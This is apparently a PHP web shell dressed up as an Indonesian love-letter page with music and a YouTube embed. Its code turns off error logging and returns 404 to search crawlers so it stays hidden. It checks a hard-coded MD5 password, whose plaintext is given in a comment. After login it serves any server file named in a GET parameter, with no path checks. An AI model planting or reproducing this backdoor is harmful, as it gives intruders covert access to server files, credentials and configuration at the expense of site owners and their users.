<?php
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$auth_pass = "482a53a7536571834cfa06881073227b"; // default: ALxWahid
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<html>
<head>
<title>Love You! &hearts;</title>
<style type="text/css">body{background:#000;color:#e2e2e2;border-radius:4px;box-sizing:border-box;border:25px solid #e20733}input[type=password]{width:250px;height:25px;color:red;background:#000;border:1px dotted lime;padding:5px;margin-left:20px;text-align:center}</style>
</head>
<center>
<header><br><br><br><br><br>
<img src="https://ia801504.us.archive.org/6/items/img20200128181829/IMG_20200128_181829.jpg" border="0"width="550px" height="320px">
<br><br><br><br><br><b>Silahkan Login!!!</b><br><br><br>
</header>
<form method="post">
<input type="password" name="pass">
</form></br></br></br></br></br></br></br></br></br></br></br></br></br><audio autoplay><source src="https://archive.org/download/shaira/shaira.mp3" type="audio/mpeg"></audio>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html>
<head><title>Love You! &hearts;</title><meta name='author' content='ALxWahid'><meta charset="UTF-8"><script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script> <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"/><style>@import url("https://fonts.googleapis.com/css?family=Cabin");#loading-wrapper{position:fixed;width:100%;height:100%;left:0;top:0;background:#222;z-index:99999}#loading-text{display:block;position:absolute;top:50%;left:50%;color:green;width:100px;height:30px;margin:-8px 0 0 -50px;text-align:center;font-size:36px}#loading-content{display:block;position:fixed;left:50%;top:50%;width:120px;height:120px;margin:-55px 0 0 -60px;border:3px solid #F00}#loading-content{border:3px solid transparent;border-top-color:#4c8bf4;border-bottom-color:#4c8bf4;border-radius:50%;-webkit-animation:loader 500ms linear infinite;-moz-animation:loader 500ms linear infinite;-o-animation:loader 500ms linear infinite;animation:loader 500ms linear infinite}@keyframes loader{0%{-webkit-transform:rotate(0deg);-ms-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(360deg);-ms-transform:rotate(360deg);transform:rotate(360deg)}}</style> <script>$(document).ready(function(){function a(){$("#loading-text").animate({opacity:0.2},500,"linear").animate({opacity:1},500,"linear",a).click(function(){$(this).animate({opacity:1},500,"linear");$(this).stop()})}a()});</script> <script>$(window).load(function(){$("#loading-wrapper").delay(1000).fadeOut("slow")});</script></head><body><div id="loading-wrapper"><div id="loading-text"><i class="fa fa-heart-o"></i></div><div id="loading-content"></div></div>
<style type="text/css">body{background-image:url('https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcRM14g-MNLyVGl561t4yQfRQa0CoqhAcuL2CQdcKRBYbKC5GRTB');background-repeat:no-repeat;background-attachment:fixed;background-size:cover;font-family:Courier New;color:#ff1493;text-align:center}a{text-decoration:none;color:#f00}</style><script type="text/javascript">/*<![CDATA[*/TypingText=function(h,f,g,e){if((typeof document.getElementById=="undefined")||(typeof h.innerHTML=="undefined")){this.running=true;return}this.element=h;this.finishedCallback=(e?e:function(){return});this.interval=(typeof f=="undefined"?100:f);this.origText=this.element.innerHTML;this.unparsedOrigText=this.origText;this.cursor=(g?g:"");this.currentText="";this.currentChar=0;this.element.typingText=this;if(this.element.id==""){this.element.id="typingtext"+TypingText.currentIndex++}TypingText.all.push(this);this.running=false;this.inTag=false;this.tagBuffer="";this.inHTMLEntity=false;this.HTMLEntityBuffer=""};TypingText.all=new Array();TypingText.currentIndex=0;TypingText.runAll=function(){for(var b=0;b<TypingText.all.length;b++){TypingText.all[b].run()}};TypingText.prototype.run=function(){if(this.running){return}if(typeof this.origText=="undefined"){setTimeout("document.getElementById('"+this.element.id+"').typingText.run()",this.interval);return}if(this.currentText==""){this.element.innerHTML=""}if(this.currentChar<this.origText.length){if(this.origText.charAt(this.currentChar)=="<"&&!this.inTag){this.tagBuffer="<";this.inTag=true;this.currentChar++;this.run();return}else{if(this.origText.charAt(this.currentChar)==">"&&this.inTag){this.tagBuffer+=">";this.inTag=false;this.currentText+=this.tagBuffer;this.currentChar++;this.run();return}else{if(this.inTag){this.tagBuffer+=this.origText.charAt(this.currentChar);this.currentChar++;this.run();return}else{if(this.origText.charAt(this.currentChar)=="&"&&!this.inHTMLEntity){this.HTMLEntityBuffer="&";this.inHTMLEntity=true;this.currentChar++;this.run();return}else{if(this.origText.charAt(this.currentChar)==";"&&this.inHTMLEntity){this.HTMLEntityBuffer+=";";this.inHTMLEntity=false;this.currentText+=this.HTMLEntityBuffer;this.currentChar++;this.run();return}else{if(this.inHTMLEntity){this.HTMLEntityBuffer+=this.origText.charAt(this.currentChar);this.currentChar++;this.run();return}else{this.currentText+=this.origText.charAt(this.currentChar)}}}}}}this.element.innerHTML=this.currentText;this.element.innerHTML+=(this.currentChar<this.origText.length-1?(typeof this.cursor=="function"?this.cursor(this.currentText):this.cursor):"");this.currentChar++;setTimeout("document.getElementById('"+this.element.id+"').typingText.run()",this.interval)}else{this.currentText="";this.currentChar=0;this.running=false;this.finishedCallback()}};/*]]>*/</script><center><p id="message"><b> Sayang.. Aku pengen ngomong sesuatu, boleh kan.? </b><br>&lt;======================&gt;<span style="color:green"><b><br>Shaira Tiara...</b></font><span style="color:lime"><br /><br> <b>Cinta ini akan selalu bertahan Yank..<br>Telah teruji oleh Waktu meski itu singkat<br>Tak pernah lelah Kau Menemaniku<br>Melewati Hari bermodal Kenekatan<br>Semua Kau korbankan demi Cinta Kita<br>Ada momen dimana semua akan terasa jauh<br>Waktu seakan pergi menjauh dan tak peduli<br>Kita terpisah oleh jarak tanpa ada pilihan<br>Orang2 Tersayang akan jauh dari pandangan<br>Namun Cinta memberikan sebuah harapan<br>Untuk kuatkan diri lewati segalanya<br>Aku kan Berlayar hadapi Badai tak berujung<br>Kebersamaan Kita adalah dunia baru yang kuimpikan<br>Aku kan merindukan Kebersamaan Kita di Makassar<br>Kupenuhi hari dengan Harapan dan Impian<br>Bukan tentang Kesuksesan ataupun bersenang-senang<br>Hanya Keinginan Hati untuk mewujudkan Janji Suciku... </b></b></b></b></b></b></b></b></b></b></b></b></b></b></b></b></font><br /><br><button type="button" onclick="alert('Cinta bukan berarti Kita selalu berada  di sisi Orang yang Kita Cintai.. Tapi Cinta itu adalah tatkala Kita berada dalam Hati Orang yang Kita Cintai.')">Click jika Kamu Kangen! &hearts;</button><br><span style="color:Red"><br><b>Jangan suka bikin jengkel yaa..!</b><br></font><center><iframe frameborder="0"scrolling="no" marginheight="0" marginwidth="0"width="788.54" height="443" type="text/html" src="https://www.youtube.com/embed/MfPOQTL8nvk?autoplay=1&fs=0&iv_load_policy=3&showinfo=0&rel=0&cc_load_policy=0&start=0&end=0&origin=https://youtubeembedcode.com"></iframe></center></center><div style="text-shadow:0 0 5px red"><marquee scrollamount="5" direction="left" width="100%"><b><i>Mencintaimu adalah takdirku, membimbingmu adalah tugasku, membahagiakanmu adalah tujuanku, jika Kamu masih banyak kekurangan, itu bagian dari kesalahanku.</marquee><script type="text/javascript">new TypingText(document.getElementById("message"),90,function(c){var d=new Array("_"," ","_"," ");return" "+d[c.length%d.length]});TypingText.runAll();</script></body>
</html>
